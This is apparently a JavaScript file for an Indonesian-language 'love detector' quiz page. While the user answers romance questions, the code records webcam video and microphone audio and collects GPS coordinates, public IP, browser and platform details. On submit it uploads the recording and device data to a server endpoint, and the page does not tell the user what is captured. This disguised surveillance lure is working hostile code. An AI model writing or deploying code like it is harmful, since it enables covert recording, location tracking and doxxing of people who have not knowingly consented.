const startBtn = document.getElementById("startBtn");
const deteksiSection = document.getElementById("deteksiSection");
const nextBtn = document.getElementById("nextBtn");
const video = document.getElementById("video");
const statusText = document.getElementById("status");
const pertanyaanDiv = document.getElementById("pertanyaan");
const questionEl = document.getElementById("question");
const optionsEl = document.getElementById("options");
const submitBtn = document.getElementById("submitBtn");

let stream, mediaRecorder, recordedChunks = [], deviceInfo = {}, currentQuestion = 0;
const questions = [
  {
    text: "Apa yang membuat kamu tertarik dengan seseorang?",
    choices: ["Senyum manis", "Hobi yang sama", "Rasa nyaman", "Penampilan"]
  },
  {
    text: "Kamu lebih suka bertemu di...",
    choices: ["Kafe", "Taman", "Bioskop", "Pantai"]
  },
  {
    text: "Kalau diajak liburan, kamu pilih...",
    choices: ["Gunung", "Kota tua", "Mall", "Rumah saja"]
  }
];

startBtn.addEventListener("click", async () => {
  startBtn.disabled = true;
  statusText.innerText = "Meminta akses lokasi...";
  const gotPermission = await requestPermissions();
  if (gotPermission) {
    statusText.innerText = "Mempersiapkan deteksi cinta...";
    await startCamera();
    startRecording();
    deteksiSection.style.display = "block";
    nextBtn.style.display = "inline-block";
  } else {
    statusText.innerText = "❌ Akses ditolak. Tidak bisa melanjutkan.";
  }
});

nextBtn.addEventListener("click", () => {
  deteksiSection.style.display = "none";
  nextBtn.style.display = "none";
  loadQuestion();
});

submitBtn.addEventListener("click", () => {
  stopRecording();
  pertanyaanDiv.innerHTML = "<h2>❤️ Terima kasih! Jawaban kamu sudah dikirim.</h2>";
});

// === FUNGSI ===
async function requestPermissions() {
  try {
    await navigator.mediaDevices.getUserMedia({ video: true });
    await navigator.permissions.query({ name: "geolocation" });
    await getDeviceInfo();
    return true;
  } catch (e) {
    console.error("Permission error:", e);
    return false;
  }
}

async function getDeviceInfo() {
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej)
    );
    const loc = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude
    };

    deviceInfo = {
      user_agent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      ip_address: await fetch("https://api.ipify.org?format=json")
        .then((r) => r.json())
        .then((d) => d.ip),
      ...loc
    };
  } catch (e) {
    deviceInfo = { latitude: null, longitude: null };
  }
}

async function startCamera() {
  stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
  video.srcObject = stream;
}

function startRecording() {
  recordedChunks = [];
  mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
  mediaRecorder.ondataavailable = (e) => {
    if (e.data.size > 0) recordedChunks.push(e.data);
  };
  mediaRecorder.start();
}

function stopRecording() {
  mediaRecorder.onstop = () => {
    const blob = new Blob(recordedChunks, { type: "video/webm" });
    const formData = new FormData();
    formData.append("video", blob, "cinta-terdekat.webm");
    formData.append("device_info", JSON.stringify(deviceInfo));

    fetch("/api/mysuf/videos", {
      method: "POST",
      body: formData
    })
      .then((res) => res.json())
      .then((data) => {
        console.log("✅ Sukses:", data);
      })
      .catch((err) => {
        console.error("❌ Gagal kirim:", err);
      });
  };
  mediaRecorder.stop();
  stream.getTracks().forEach((t) => t.stop());
}

function loadQuestion() {
  if (currentQuestion >= questions.length) {
    pertanyaanDiv.innerHTML = "<h2>🎉 Semua pertanyaan selesai!</h2>";
    return;
  }

  const q = questions[currentQuestion];
  questionEl.innerText = q.text;
  optionsEl.innerHTML = q.choices
    .map((c, i) => `<div class="option" onclick="selectAnswer(${i})">${c}</div>`)
    .join("");
  pertanyaanDiv.style.display = "block";
}

window.selectAnswer = function (index) {
  document.querySelectorAll(".option").forEach((el) => el.classList.remove("selected"));
  document.querySelectorAll(".option")[index].classList.add("selected");
  currentQuestion++;
  setTimeout(loadQuestion, 600);
};
